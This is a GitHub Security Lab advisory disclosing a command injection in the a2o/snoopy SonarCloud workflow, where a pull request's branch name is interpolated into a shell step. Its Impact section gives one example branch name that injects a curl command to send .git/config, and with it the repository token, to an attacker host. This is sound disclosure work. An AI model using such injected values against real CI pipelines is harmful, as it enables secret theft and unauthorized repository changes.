<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-015: Command injection in a2o/snoopy workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-01-18: Report sent to maintainers.</li>
  <li>2021-01-18: Maintainers acknowledged.</li>
  <li>2021-01-18: Issue resolved.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/a2o/snoopy/blob/master/.github/workflows/code-qa-sonarcloud.yml">code-qa-sonarcloud.yml</a> GitHub workflow is vulnerable to unauthorized modification of the base repository or secrets exfiltration from a Pull Request.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/a2o/snoopy">a2o/snoopy</a> repository</p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest changeset of <a href="https://github.com/a2o/snoopy/blob/9cdf75b4c11e683ed4f00137d97fecfc32ca1f99/.github/workflows/code-qa-sonarcloud.yml">code-qa-sonarcloud.yml</a> to the date.</p>

<h2 id="details">Details</h2>

<h3 id="issue-a-branch-name-from-the-pull-request-is-used-to-format-a-shell-command">Issue: A branch name from the pull request is used to format a shell command</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
<span class="nn">...</span>
  <span class="na">pull_request_target</span><span class="pi">:</span>
<span class="nn">...</span>
      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Scan and submit to SonarCloud - on PR</span>
        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
            <span class="s">CURRENT_BRANCH_NAME=`git branch --show-current`</span>
            <span class="s">SONARCLOUD_TAG=`./dev-tools/libexec/get-sonarcloud-tag.sh`</span>
            <span class="s">/opt/sonar-scanner \</span>
              <span class="s">-Dsonar.organization=a2o \</span>
              <span class="s">-Dsonar.projectKey=snoopy \</span>
              <span class="s">-Dsonar.sources=. \</span>
              <span class="s">-Dsonar.pullrequest.provider=github \</span>
              <span class="s">-Dsonar.pullrequest.key=${{ github.event.pull_request.number }} \</span>
              <span class="s">-Dsonar.pullrequest.branch=${{github.event.pull_request.head.repo.owner.login}}:${{github.event.pull_request.head.ref}} \</span>
<span class="s">...</span>
        <span class="s">env</span><span class="pi">:</span>
          <span class="na">SONAR_TOKEN</span><span class="pi">:</span> <span class="s">${{ secrets.SONAR_TOKEN }}</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>If the repository owner doesn’t notice a pull request branch name and assigns a ‘/ci run additional tests’
label this vulnerability allows for arbitrary command injection into the bash script which allows for unauthorized modification of the base repository and secrets exfiltration. For example a PR from branch named <code class="language-plaintext highlighter-rouge">a;${IFS}curl${IFS}-d${IFS}@.git/config${IFS}evil.com${IFS}#</code> would exfiltrate the repository token to the attacker controlled server.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-015</code> in any communication regarding this issue.</p